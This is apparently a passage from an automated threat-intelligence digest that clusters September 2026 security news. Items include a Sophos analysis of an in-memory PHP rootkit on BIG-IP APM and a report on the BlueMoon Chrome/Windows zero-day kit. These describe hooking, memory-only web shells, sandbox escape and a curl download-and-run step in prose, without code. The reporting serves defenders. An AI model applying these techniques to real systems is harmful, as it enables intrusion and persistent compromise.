Channel Business Security AI Infrastructure Lists & Awards Resources About Events Newsletter Back to Menu Related Topics Channel Analysis Channel Careers Helpdesk, ITSM & Other Tools Mergers & Acquisitions Running an MSP SIs, VARs, Advisors & MSSP News Vendor Leadership & Partner Programs Articles View All Hover to load posts Related Topics Managed Services Next-Gen Solutions Resiliency, Backup & Recovery Tools & Platforms Articles View All Hover to load posts Related Topics Building Channel Revenue Emerging Tech LLMs, Chatbots, and Agents MSP Automation Solutions Articles View All Hover to load posts Related Topics Cloud & Hybrid On-Premises Virtualization Articles View All Hover to load posts Articles Link to AI 50 List AI 50 List Channel Insider's editorial team spotlights the top AI leaders from MSPs, vendors, and channel businesses delivering measurable outcomes. Link to CML 100 Honorees CML 100 Honorees Check out our CML 100 List to discover the top channel marketing individuals who are transforming channel marketing for their organizations. Link to HSP 250 List HSP 250 List View our HSP250 list to see the top Hybrid Solution Providers that have proactively embraced the future of tech. Link to The 2024 Channel Insider VIP List The 2024 Channel Insider VIP List Channel Insider sought nominations from IT vendors, solution providers, and partners to highlight impactful collaborations. Check out our top choices here. Resource Hubs Powering Modern Data Centers & Distributed Infrastructures Videos Scale Computing Platform//2025 Fortinet Cybersecurity Summit Pax8 Beyond Partner Content Featured Resources Link to PwC: AI Adoption Now Hinges on Workflow Reinvention PwC: AI Adoption Now Hinges on Workflow Reinvention PwCâs Rima Safari explains how OpenAI, agentic AI, governance and data strategy are reshaping enterprise AI adoption and production. Link to AI Tokenomics: How Businesses Can Manage AI Costs AI Tokenomics: How Businesses Can Manage AI Costs SHIâs Shane Cronin explains AI tokenomics, FinOps, AI ROI and how businesses can make smarter decisions about managing growing AI costs. Link to Logicalis: Enterprise AI Is Moving Beyond Experimentation Logicalis: Enterprise AI Is Moving Beyond Experimentation Logicalis VP Anita Swann explains how Microsoft partners can help enterprises move AI from experimentation to secure, measurable business outcomes. Link to How Kaseya is Helping MSPs Evolve Security Operations How Kaseya is Helping MSPs Evolve Security Operations Kaseyaâs JV Varma explains how MSPs can modernize security models, strengthen cyber resilience, and move beyond reactive security practices. Link to How Channel Partners Can Turn AI Hype into Customer Value How Channel Partners Can Turn AI Hype into Customer Value Xentegra CTO Phillip Sellers explains how partners can turn AI hype into customer value while addressing security, data governance and adoption. Link to AI Security Hype Creates New Opportunities for the Channel AI Security Hype Creates New Opportunities for the Channel Arcovaâs Joseph Perry discusses AI security hype, emerging risks and how channel partners can become trusted strategic advisors for customers. Facebook facebook linkedin YouTube youtube RSS rss Spotify spotify X x Newsletter Channel Business Channel Business Related Topics Channel Analysis Channel Careers Helpdesk, ITSM & Other Tools Mergers & Acquisitions Running an MSP SIs, VARs, Advisors & MSSP News Vendor Leadership & Partner Programs Top Articles View All Hover to load posts Security Security Related Topics Managed Services Next-Gen Solutions Resiliency, Backup & Recovery Tools & Platforms Top Articles View All Hover to load posts AI AI Related Topics Building Channel Revenue Emerging Tech LLMs, Chatbots, and Agents MSP Automation Solutions Top Articles View All Hover to load posts Infrastructure Infrastructure Related Topics Cloud & Hybrid On-Premises Virtualization Top Articles View All Hover to load posts More Lists & Awards
```

#### Corroborating sources (1)

- **Proofpoint Threat Insight** (detection_response_operations)
  - Title: Proofpoint SOC Analyst Agent Uses OpenAI Cyber Models
  - Published: 2026-09-08T21:23:40+00:00
  - Link: https://www.proofpoint.com/us/newsroom/news/proofpoint-soc-analyst-agent-uses-openai-cyber-models

### Cluster dc442d78ed — score 8

- Title: Dissecting a PHP web server rootkit
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-09-07T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/dissecting-a-php-web-server-rootkit
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- cve_ids: CVE-2025-53521
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- cve_ids: CVE-2025-53521
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>Sophos X-Ops takes a deep dive into an insidious piece of malware</p> Categories: Threat Research Tags: rootkit, php, webshell
```

#### Full body

```
Dissecting a PHP web server rootkit Sophos X-Ops takes a deep dive into an insidious piece of malware Written by Luke Mitchell Threat Research rootkit php webshell Share This Link Copied SophosLabs recently acquired a Linux implant associated with compromised BIG-IP Access Policy Management (APM) environments that use Apache and PHP components. The malware demonstrates advanced techniques including custom ELF loading, function hooking, and runtime code patching to evade detection while maintaining persistent access through hidden web shells. The implant delivers a familiar outcome – on-demand server‑side code execution commonly associated with web shells – but implements it using deeper Linux- and Apache‑specific tradecraft. The malware targets deployments featuring Apache, libphp, APR module loading, BIG-IP APM webtop components, and BIG-IP upgrade workflows, suggesting it was developed for specific environments. F5 associates the related c05d5254 activity with BIG-IP APM systems affected by CVE-2025-53521 , an exploited unauthenticated RCE in BIG-IP APM when an access policy is configured on a virtual server. If you believe you are, or have been, using affected BIG-IP APM versions, follow F5’s remediation and compromise-assessment guidance before applying generic Apache or PHP hardening recommendations. Our analysis suggests the sample discussed here represents a second-stage payload; during parallel analysis of a related umount sample, we noted a distinct installer/propagation component responsible for infecting /usr/sbin/httpd , persisting across BIG-IP upgrade images, modifying SELinux configurations, and deploying the payload analyzed in this article. The first-stage loader looks for BIG-IP upgrade/install-image workflows under, for example, /mnt/tm_install . Notably, the malicious prefix size used by the infected httpd (0x5430) matches the size of the payload embedded within the umount sample, strongly suggesting that the latter is responsible for deploying the former. The second-stage sample hides key operational strings with RC4, gains execution before the host application main() function is invoked by intercepting __libc_start_main , targets Apache’s PHP module by hooking the Apache Portable Runtime (APR) module loader ( apr_dso_load ), and injects a PHP web shell into memory. It does the latter by manipulating mmap behavior inside libphp at runtime – so that only the infected process sees the malicious content and nothing ever touches the disk. Alongside this web‑based access, the implant also creates a local UNIX domain socket and can redirect a connection into /bin/bash , enabling interactive access without opening a TCP listening port. Based on current public reporting and our analysis, the observed targeting centers on BIG-IP APM webtop environments rather than generic Apache/PHP or common CMS deployments. Note: While engaged in this research, we became aware that researchers from ESET had conducted analysis of this malware, which they dubbed ‘PoisonedRefresh.’ Our analysis independently observed overlapping behavior and contributes further detail. SHA256 of sample: 26bd5b0722d1dbab5db749a063c49bc8638653ac2addfead7a9cb3d6d57bccc9 Why this case matters When defenders hear ‘web shell,’ they usually think of a small server‑side script, often written in PHP, JSP, or ASP, planted in a web‑accessible directory to provide persistent remote code execution through ordinary HTTP requests. The script exists as a file on disk, perhaps obfuscated or hidden among legitimate content, but discoverable nonetheless. That assumption has shaped years of detection logic. Analysts search web root directories for suspicious scripts, look for tell‑tale parameter names in HTTP requests, and rely on file integrity monitoring to surface unexpected changes. Some web shell families became notorious precisely because they demonstrated how powerful that simple attack model could be. China Chopper , for example, is a well-known web shell that
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: Dissecting a PHP web server rootkit
  - Published: 2026-09-07T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/dissecting-a-php-web-server-rootkit
  - Summary: <p>Sophos X-Ops takes a deep dive into an insidious piece of malware</p> Categories: Threat Research Tags: rootkit, php, webshell

### Cluster 28edf79473 — score 8

- Title: AI SIEM Search
- Source: Huntress (detection_response_operations)
- Published: 2026-09-07T14:00:00+00:00
- Link: https://www.huntress.com/blog/ai-siem-search
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The new Huntress AI SIEM search feature lets you find answers in plain English, with no query language fluency required. Ask questions, get results, and skip the syntax.
```

#### Full body

```
Home Blog AI SIEM Search: Stop Learning Query Languages, Start Finding Answers Published: September 7, 2026 AI SIEM Search: Stop Learning Query Languages, Start Finding Answers By: Cody Staley Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Every Security Information and Event Management (SIEM) solution on the market makes the same quiet assumption: that you know at least one query language, and maybe even have a favorite. ESQL, KQL, SPL, pick your flavor. The data's all there, sitting in your logs, but getting to it means writing syntax that most IT admins never had a reason to learn. So the logs sit there, technically searchable, but practically locked. That's a real problem for the teams we work with. If you're a two-person IT shop covering hundreds of endpoints, "just learn ESQL" is advice from someone who's never sat at your workstation. You bought a SIEM solution to answer questions like "who failed to log in last night?" without opening a support ticket or a textbook. AI Search in Huntress Managed SIEM lets you ask those questions in plain English. Type "show me failed logins on Eddie's machine," and you get the logs, without touching a query builder or writing a line of ESQL. How SIEM AI Works Open the SIEM, type what you want to see, and hit "Search." You can ask for failed logins on a specific endpoint, where users have been logging in the world, or just "what's going on here" for a host that's acting weird. AI Search translates your question into a real ESQL query behind the scenes and returns matching logs. It's…as simple as it sounds. Here's where AI Search differs from the rest of the AI inside the Huntress Agentic Security Platform . Most of what's happening is behind-the-scenes, like how the platform triages and processes signals. AI Search puts that same capability directly in your hands, where you can see exactly what it found and why. It Teaches You ESQL While You Use It This is the feature I'd argue matters most, and it's the easiest one to miss. Every AI Search you run has an ESQL button sitting right next to it. Click it, and you see the exact query your plain-English question generated. So "show me failed logins for Eddie's machine" stops being magic and becomes a worked example. You can read the ESQL, see how the pieces map to what you asked, and start tweaking it yourself, narrowing the time window or adding a second condition. Each search becomes a small lesson in the language, using your own data to answer your actual questions. So, while you don't have to know ESQL to use AI Search, your own searches can actually help you learn it. From One-Time Search to Standing Automated by AI Alert A good search is usually a question you'll ask again. If failed logins on a specific server matter to you today, they'll matter next Tuesday too. Once you've run a search you like, save it and schedule it as a custom alert at whatever cadence fits the question: hourly, daily, or weekly. The search you typed in plain English becomes a recurring check that lands in front of you automatically, so you don't have to re-run anything…even though you probably will. The gap between "I wondered about this once" and "I'm monitoring this continuously" used to be an ESQL query and an alerting config process. Now, it's two clicks. What's Next? Answers, Not Just Logs Raw logs are honest, but they're not exactly user-friendly. If you've never worked in a SIEM solution before, your questions are answered with a wall of log lines in a query language you still have to decode. The next version of AI Search, currently in the works, closes that gap. Ask a question, and instead of just getting logs back, you'll get a summarized answer: what happened, in plain language, with the logs you want to dig into. There's a massive difference between having data and having an answer. AI Search makes finding answers easy. Try Huntress Managed SIEM and AI Search for Yourself The best way to understand AI Search is to ask it something. P
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: AI SIEM Search
  - Published: 2026-09-07T14:00:00+00:00
  - Link: https://www.huntress.com/blog/ai-siem-search
  - Summary: The new Huntress AI SIEM search feature lets you find answers in plain English, with no query language fluency required. Ask questions, get results, and skip the syntax.

### Cluster 26a67e9e74 — score 8

- Title: New 'BlueMoon' kit exploited Windows and Chrome zero-day flaws
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-10T14:11:34+00:00
- Link: https://www.bleepingcomputer.com/news/security/new-bluemoon-kit-exploited-windows-and-chrome-zero-day-flaws/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, web_shell_backdoor, zero_day
- actor_attribution: APT31
- affected_industries: aviation_defense, government, manufacturing_industrial
- cve_ids: CVE-2026-85046, CVE-2026-85880, CVE-2026-87491
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, apt_espionage, web_shell_backdoor
- actor_attribution: APT31
- affected_industries: government, manufacturing_industrial, aviation_defense
- cve_ids: CVE-2026-85046, CVE-2026-87491, CVE-2026-85880
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Multiple cyber-espionage groups deployed an exploit kit dubbed "BlueMoon" that leveraged zero-day vulnerabilities in Microsoft Windows and Google Chrome. [...]
```

#### Full body

```
New 'BlueMoon' kit exploited Windows and Chrome zero-day flaws By Bill Toulas September 10, 2026 10:11 AM 0 Multiple cyber-espionage groups deployed an exploit kit dubbed “BlueMoon” that leveraged zero-day vulnerabilities in Microsoft Windows and Google Chrome. BlueMoon combines two security issues in Chromium-based browsers that allow remote code execution and sandbox escape with a kernel local privilege escalation in Windows. The kit appears to be a shared modular tool that supports exploit additions and was used in distinct operations. Researchers at enterprise cybersecurity company Proofpoint observed BlueMoon being used since August 28 in spearphishing operations attributed to the JungleBamboo (a.k.a. APT31, Violet Typhoon, APT31, Tide Castle) threat actor associated with China. Cybersecurity and threat intelligence company Volexity also observed similar activity on September 1st, in campaigns from another actor it tracks as UTA0560 that targeted "customers at multiple non-governmental organizations (NGOs)." According to the researchers, the BlueMoon developer maintainers take advantage of the delay between public Chromium fixes and stable Chrome releases, reverse-engineer public code changes, and create exploits to target downstream browser users. The three flaws chained by the BlueMoon exploit kit are: CVE-2026-85046 : a type-confusion flaw in Chrome’s V8 JavaScript engine that provides arbitrary memory access inside the V8 sandbox CVE-2026-87491 : a V8 sandbox escape that corrupts WebAssembly metadata to run embedded shellcode CVE-2026-85880 : a heap-based buffer overflow in Windows ALPC that allows local privilege escalation Proofpoint says attackers exploited CVE-2026-85880 as a classic zero-day, suspecting it has been leveraged since 2025 and repackaged in BlueMoon. “The LPE DLL compilation timestamp is from 2025 and did not appear to be forged,” Proofpoint explains . “This - combined with the exploit targeting older Windows builds - suggests that the exploit creator repackaged an existing capability into the BlueMoon exploit kit.” BlueMoon runs the exploit inside a Web Worker, retrying it up to five times. It fingerprints the system, exploits the Windows privilege elevation flaw to elevate the Chrome renderer, and injects into Chrome’s parent process to run an operator-selected command. The default final command uses curl to save an executable, typically a malware loader, under %TEMP% and run it. BlueMoon attack chain overview Source: Proofpoint Threat groups and targets The reports from Volexity and Proofpoint [ 1 , 2 ] identify four distinct activity clusters associated with BlueMoon deployments, three of them described as Chinese or China-aligned. JungleBamboo, the first Chinese state-sponsored actor observed using BlueMoon, is known for targeting NGOs in the US, mining companies, and individual high-value targets, using the Longtale/GemStone credential stealer extension disguised as Google Gemini. The second hacker group is UTA0560, which targeted NGOs using donation lures and triggered an infection chain that delivered Grimwedge, an in-memory JScript backdoor for reconnaissance, file and process management, command execution, and payload uploads. Phishing emails used in the attacks Source: Proofpoint The third cluster is tracked as UNK_LateNight, known for deploying the ShadowPad backdoor on systems belonging to U.S. aerospace and defense-industrial-base companies. A fourth group, tracked as UNK_DoubleCheck, targeted Vietnamese manufacturing firms with an in-memory Rust loader, though the final payload couldn’t be retrieved for analysis. Proofpoint expects BlueMoon adoption and deployment to increase, potentially reaching financially motivated attackers in the future, so defenders are advised to use the provided indicators of compromise in both reports to block the activity early. Both cybersecurity companies shared indicators of compromise for files and network infrastructure observed in attacks using the Blu
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: New 'BlueMoon' kit exploited Windows and Chrome zero-day flaws
  - Published: 2026-09-10T14:11:34+00:00
  - Link: https://www.bleepingcomputer.com/news/security/new-bluemoon-kit-exploited-windows-and-chrome-zero-day-flaws/
  - Summary: Multiple cyber-espionage groups deployed an exploit kit dubbed "BlueMoon" that leveraged zero-day vulnerabilities in Microsoft Windows and Google Chrome. [...]

### Cluster ab440398cd — score 8

- Title: What’s new with Google Cloud
- Source: Google Cloud Security (cloud_identity_infrastructure)
- Published: 2026-09-10T16:00:00+00:00
- Link: https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 1
- Strong signals: Google Cloud, Google/Gemini

#### Cluster taxonomy (union across members)
- affected_industries: financial_services, retail_ecommerce
- affected_products: Google Cloud, Google/Gemini
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: Google Cloud, Google/Gemini
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . aside_block <ListValue: []> Sept 7 - Sept 10 Why Your Voice Agent Needs Session Auditing Moving voice agents to production demands robust quality monitoring. This guide dives deep into the inner workings of the Agent Development Kit (ADK) responsible for audio session auditing. Learn how the ADK's save_live_blob feature intercepts, buffers, and stores raw audio chunks during active Gemini Live sessions. We explore building an automated post-processing pipeline to seamlessly stitch these fragments into cohesive, playable audio files. Discover how to leverage these vital audio audit trails to monitor real-world interactions, diagnose failures,
```

#### Full body

```
Inside Google Cloud What’s new with Google Cloud September 10, 2026 Google Cloud Content & Editorial Try Gemini Enterprise today The front door to AI in the workplace Try now Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . Sept 7 - Sept 10 Why Your Voice Agent Needs Session Auditing Moving voice agents to production demands robust quality monitoring. This guide dives deep into the inner workings of the Agent Development Kit (ADK) responsible for audio session auditing. Learn how the ADK's save_live_blob feature intercepts, buffers, and stores raw audio chunks during active Gemini Live sessions. We explore building an automated post-processing pipeline to seamlessly stitch these fragments into cohesive, playable audio files. Discover how to leverage these vital audio audit trails to monitor real-world interactions, diagnose failures, and ensure enterprise-grade reliability. Read the full guide here . Pub/Sub SMTs can now AI Inference your Gemini Enterprise Agent Platform models! Pub/Sub AI Inference SMTs allow you to apply inference on an incoming stream of events using models hosted in Gemini Enterprise Agent Platform. The model’s prediction is appended to your event, making it available for downstream processing in your data warehouse (like BigQuery) or operational database (like BigTable). This feature, now generally available, can dramatically simplify or enhance anomaly detection systems you are operating. PostgreSQL Source Connector is now generally available in Managed Service for Apache Kafka! Managed Service for Apache Kafka’s PostgreSQL connector allows customers to capture changes from their PostgreSQL database and ingest them into their Kafka infrastructure with low latency. This source connector is compatible with Cloud SQL for Postgres , AlloyDB, and self-managed PostgreSQL databases. Try this along with our entire portfolio of managed connectors, including MirrorMaker 2.0, BigQuery, Cloud Storage, and Pub/Sub . E-mail kafka-hotline@google.com if you have questions or feedback! Pause-on-failure for Dataflow batch jobs is GA Dataflow pause-on-failure enables you to preserve the state of a batch Dataflow job before it fails. By pausing your Dataflow job, you can address issues that are external to the pipeline and resume processing without losing completed work. This helps you better manage resource costs and improve job reliability when you face temporary outages or capacity constraints. The insertAll API is now the BigQuery Storage Write API (REST) The legacy insertAll streaming API is now rebranded as the BigQuery Storage Write API (REST). By dropping the "legacy" label, developers can confidently build long-term HTTP-based streaming workflows. This stateless JSON-over-HTTPS endpoint offers a lightweight alternative to heavy gRPC libraries—ideal for serverless web apps, IoT telemetry, and AI logging. The transition is seamless for existing users, requiring zero code changes and offering 100% backward compatibility. However, the Storage Write API (gRPC) version remains the recommended standard for high-throughput, continuous pipelines. AlloyDB Omni Red Hat RPM Orchestrator now Generally Available AlloyDB Omni Red Hat RPM orchestrator is now Generally Available. The AlloyDB Omni Red Hat RPM orchestrator offers a new way to manage PostgreSQL-compatible workloads on bare metal or VM platforms, combining the high performance of AlloyDB, access to generative AI features and Gemini models to build AI agents and applications, and full automation. The orchestrator simplifies cluster provisioning and lifecycle management by allowing you to define reference architecture specifications, customizable by adjusting instance paramet
```

#### Corroborating sources (1)

- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: What’s new with Google Cloud
  - Published: 2026-09-10T16:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
  - Summary: Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . aside_block <ListValue: []> Sept 7 - Sept 10 Why Your Voice Agent Needs Session Auditing Moving voice agents to production demands robust quality monitoring. This guide dives deep into the inner workings of the Agent Development Kit (ADK) responsible for audio session auditing. Learn how the ADK's save_live_blob feature intercepts, buffers, and stores raw audio chunks during active Gemini Live sessions. We explore building an automated post-processing pipeline to seamlessly stitch these fragments into cohesive, playable audio files. Discover how to leverage these vital audio audit trails to monitor real-world interactions, diagnose failures,

### Cluster ead60a6a0f — score 8

- Title: Datasette 1.0a39 and 0.65.4 security releases
- Source: Simon Willison (ai_security_agentic_risk)
- Published: 2026-09-11T03:27:16+00:00
- Link: https://simonwillison.net/2026/Sep/11/datasette-security/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Datasette 1.0a39 and 0.65.4 security releases Today we're releasing two new security patch versions of Datasette: 1.0a39 and 0.65.4 - one for the current alpha series and one for the stable 0.65.x family. These are security fixes which you should apply if you are running a Datasette instance on the public web - in particular if that instance mixes both public and private tables. Following issues reported by Sevban Dönmez , Alex Garcia and I ran an extensive audit of Datasette using Claude Fable 5.1, GPT-5.6, and GPT-6 Astra. We then spent almost a week collaborating on and reviewing the fixes. They helped find some very subtle bugs. We'll be incorporating security audits by frontier models into all of our development work going forward. Alex came up with a way of splitting the work which I found extremely productive: Alex Garcia and I worked together running and then responding to the audit, working in a shared private repository. For most of the issues we split the work: one of us wou
```

#### Full body

```
Simon Willison’s Weblog Subscribe Sponsored by: Portnox — Shadow AI is the new shadow IT. On Sept. 10, Forrester Research and Portnox share practical steps to regain AI agent visibility, access management, and policy enforcement. Register today 11th September 2026 - Link Blog Datasette 1.0a39 and 0.65.4 security releases . Today we're releasing two new security patch versions of Datasette: 1.0a39 and 0.65.4 - one for the current alpha series and one for the stable 0.65.x family. These are security fixes which you should apply if you are running a Datasette instance on the public web - in particular if that instance mixes both public and private tables. Following issues reported by Sevban Dönmez , Alex Garcia and I ran an extensive audit of Datasette using Claude Fable 5.1, GPT-5.6, and GPT-6 Astra. We then spent almost a week collaborating on and reviewing the fixes. They helped find some very subtle bugs. We'll be incorporating security audits by frontier models into all of our development work going forward. Alex came up with a way of splitting the work which I found extremely productive: Alex Garcia and I worked together running and then responding to the audit, working in a shared private repository. For most of the issues we split the work: one of us would create the automated tests highlighting the issue, then the other would implement the fix. This ensured that two separate humans had eyes on each of the issues, in addition to our coding agents running different models. Posted 11th September 2026 at 3:27 am Recent articles Some thoughts on the Navier–Stokes Millennium Prize Problem - 8th September 2026 The Pelican comparison grid for Astra is pretty interesting - 4th September 2026 OpenAI's rogue agents were caught communicating via public wikis - 4th September 2026 This is a link post by Simon Willison, posted on 11th September 2026 . releases 31 security 630 ai 2,227 datasette 1,539 generative-ai 1,973 llms 1,939 agentic-engineering 61 ai-security-research 41 Monthly briefing Sponsor me for $10/month and get a curated email digest of the month's most important LLM developments. Pay me to send you less! Sponsor & subscribe Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026
```

#### Corroborating sources (1)

- **Simon Willison** (ai_security_agentic_risk)
  - Title: Datasette 1.0a39 and 0.65.4 security releases
  - Published: 2026-09-11T03:27:16+00:00
  - Link: https://simonwillison.net/2026/Sep/11/datasette-security/
  - Summary: Datasette 1.0a39 and 0.65.4 security releases Today we're releasing two new security patch versions of Datasette: 1.0a39 and 0.65.4 - one for the current alpha series and one for the stable 0.65.x family. These are security fixes which you should apply if you are running a Datasette instance on the public web - in particular if that instance mixes both public and private tables. Following issues reported by Sevban Dönmez , Alex Garcia and I ran an extensive audit of Datasette using Claude Fable 5.1, GPT-5.6, and GPT-6 Astra. We then spent almost a week collaborating on and reviewing the fixes. They helped find some very subtle bugs. We'll be incorporating security audits by frontier models into all of our development work going forward. Alex came up with a way of splitting the work which I found extremely productive: Alex Garcia and I worked together running and then responding to the audit, working in a shared private repository. For most of the issues we split the work: one of us wou

### Cluster 8e76e4eaf9 — score 8

- Title: Mythos Vulnerability Firehose Hits a Human Bottleneck
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-09-09T21:19:55+00:00
- Link: https://www.darkreading.com/application-security/mythos-vulnerability-firehose-hits-human-bottleneck
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure
- affected_industries: government
- affected_products: Anthropic/Claude
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: vulnerability_disclosure
- affected_industries: government
- affected_products: Anthropic/Claude
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
An analysis of Project Glasswing findings shows only a fraction of the bugs it has discovered have reached disclosure, and an even smaller number have been fixed.
```

#### Full body

```
Application Security Threat Intelligence Vulnerabilities & Threats Cyber Risk News Mythos Vulnerability Firehose Hits a Human Bottleneck An analysis of Project Glasswing findings shows only a fraction of the bugs it has discovered have reached disclosure, and an even smaller number have been fixed. Jai Vijayan , Contributing Writer September 9, 2026 4 Min Read Source: sirloh via Shutterstock A new analysis of public data from Anthropic's Project Glasswing has highlighted a significant gap between the number of vulnerability findings generated by its Claude frontier model and those that ultimately prove to be real, serious, and worth fixing. The distinction matters because it suggests that the bottleneck in vulnerability research may increasingly lie in validating new flaws and coordinating their remediation rather than in discovering them. Barely 10% Have Made It to Disclosure Stage Patrick Garrity, a security researcher at VulnCheck, recently analyzed Anthropic’s Vulnerability Disclosure Ledger , which is a public record tracking Project Glasswing-related findings as they move through the vulnerability disclosure and remediation process. The analysis showed that Anthropic's Claude Mythos generated a total of 26,153 vulnerability findings across numerous software projects since Project Glasswing's launch in April 2026. Related: US Government Accuses Chinese AI Firms of Distilling Frontier Models However, only 2,736 of those findings, or slightly more than 10%, had made it into the disclosure ledger, meaning they have either been disclosed to the appropriate software maintainer or are in the process of being disclosed. Less than 0.8% of flaws, a mere 202, are currently patched, and 245 were withdrawn. Another 191 vulnerabilities were in the pre-disclosure stage and had not been reported to their maintainers yet. The remaining nearly 90% of Claude Mythos-generated findings had not made it to the ledger yet, suggesting human validation and coordination have become a bottleneck in determining which AI-generated findings warrant disclosure and remediation, Garrity says. The results are "not a surprise for those of us closer to understanding how coordinated vulnerability disclosure works," Garrity tells Dark Reading. But it "is much different than the narrative frontier model providers have positioned," which has largely focused on AI's ability to dramatically accelerate vulnerability discovery. "It seems like they are learning this through trial and error," he says. True Positives and Severity Assessments Garrity's analysis also raised questions about Anthropic's claims regarding the accuracy of Mythos' vulnerability findings and the model's ability to assess their severity. He noted that the 202 findings marked as fixed in the vulnerability ledger are notably fewer than the 245 vulnerabilities marked as withdrawn. The numbers warrant closer scrutiny of how Anthropic defines and measures its claimed 91.4% true-positive rate, he wrote. Similarly, Garrity found Anthropic's AI to be substantially more aggressive in assessing severity of vulnerabilities compared with the actual maintainers of the affected software. Claude, for instance, assessed 91.5% of the findings that made it to the ledger as being critical or high severity. However, project maintainers themselves determined only 61.3% as being in this severity category. Related: AI's Vulnerability Surge May Be More Manageable Than First Feared "My gut tells me the team didn't prompt Claude with detailed instructions on how to determine severity, or if they did, it wasn't well thought out, resulting in higher severity determinations," Garrity says. "I'd like to see the CVSS metrics used to generate severity and the CWEs used to help better understand the actual weaknesses, both of which are industry standards expected when disclosing vulnerabilities." Signs of a Larger Issue? The questions around AI's ability to accurately assess vulnerability findings are not unique to Glasswing.
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Mythos Vulnerability Firehose Hits a Human Bottleneck
  - Published: 2026-09-09T21:19:55+00:00
  - Link: https://www.darkreading.com/application-security/mythos-vulnerability-firehose-hits-human-bottleneck
  - Summary: An analysis of Project Glasswing findings shows only a fraction of the bugs it has discovered have reached disclosure, and an even smaller number have been fixed.

### Cluster 617f4237df — score 8

- Title: China-Linked UNC3569 Exploited Sogou Input Method Flaw to Deploy GRAYRABBIT Backdoor
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-11T07:14:09+00:00
- Link: https://thehackernews.com/2026/09/china-linked-unc3569-exploited-sogou.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: UNC3569

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- actor_attribution: UNC3569
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- actor_attribution: UNC3569
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A China-linked hacking group exploited a flaw in Sogou Input Method, one of the most widely used tools for typing Chinese characters on Windows, to install a backdoor on victims' computers, security company Gen Digital said in research published Thursday. The attack started with a crafted link and ended with the attacker able to do anything the logged-in user could do. Tencent, which owns
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: China-Linked UNC3569 Exploited Sogou Input Method Flaw to Deploy GRAYRABBIT Backdoor
  - Published: 2026-09-11T07:14:09+00:00
  - Link: https://thehackernews.com/2026/09/china-linked-unc3569-exploited-sogou.html
  - Summary: A China-linked hacking group exploited a flaw in Sogou Input Method, one of the most widely used tools for typing Chinese characters on Windows, to install a backdoor on victims' computers, security company Gen Digital said in research published Thursday. The attack started with a crafted link and ended with the attacker able to do anything the logged-in user could do. Tencent, which owns

### Cluster 94a219b713 — score 8

- Title: Fake IT Calls Target Executives in Microsoft 365 Data Theft and Extortion Attacks
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-07T15:51:56+00:00
- Link: https://thehackernews.com/2026/09/microsoft-365-attackers-use-help-desk.html
- Fetch status: not_attempted
- Member count: 4
- Corroborating source count: 3
- Strong signals: Microsoft 365

#### Cluster taxonomy (union across members)
